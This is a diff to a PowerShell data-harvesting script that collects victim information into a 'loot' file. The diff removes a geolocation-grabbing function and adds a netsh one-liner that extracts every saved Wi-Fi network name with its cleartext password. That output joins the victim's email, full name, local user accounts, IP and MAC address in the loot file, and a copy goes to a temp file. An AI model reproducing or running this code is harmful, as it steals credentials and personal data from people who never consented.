@@ -71,43 +71,6 @@ function Get-email {
 
 $email = Get-email
 
-
-#------------------------------------------------------------------------------------------------------------------------------------
-
-function Get-GeoLocation{
-	try {
-	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
-	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
-	$GeoWatcher.Start() #Begin resolving current locaton
-
-	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
-		Start-Sleep -Milliseconds 100 #Wait for discovery.
-	}  
-
-	if ($GeoWatcher.Permission -eq 'Denied'){
-		Write-Error 'Access Denied for Location Information'
-	} else {
-		$GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
-	}
-	}
-    # Write Error is just for troubleshooting
-    catch {Write-Error "No coordinates found" 
-    return "No Coordinates found"
-    -ErrorAction SilentlyContinue
-    } 
-
-}
-
-$GeoLocation = Get-GeoLocation
-
-$GeoLocation = $GeoLocation -split " "
-
-$Lat = $GeoLocation[0].Substring(11) -replace ".$"
-
-$Lon = $GeoLocation[1].Substring(10) -replace ".$"
-
-############################################################################################################################################################
-
 # local-user
 
 $luser=Get-WmiObject -Class Win32_UserAccount | Format-Table Caption, Domain, Name, FullName, SID | Out-String 
@@ -270,6 +233,11 @@ $videocard=Get-WmiObject Win32_VideoController | Format-Table Name, VideoProcess
 
 ############################################################################################################################################################
 
+$wifiProfiles = (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} 
+| %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String
+
+
+$wifiProfiles > $env:TEMP/--wifi-pass.txt
 # OUTPUTS RESULTS TO LOOT FILE
 
 $output = @"
@@ -317,10 +285,6 @@ Full Name: $fullName
 
 Email: $email
 
-GeoLocation:
-Latitude:  $Lat 
-Longitude: $Lon
-
 ------------------------------------------------------------------------------------------------------------------------------
 
 Local Users:
@@ -348,6 +312,8 @@ $localIP
 MAC:
 $MAC
 
+WIFI Passwords:
+$wifiProfiles
 ------------------------------------------------------------------------------------------------------------------------------
 
 Computer Name:
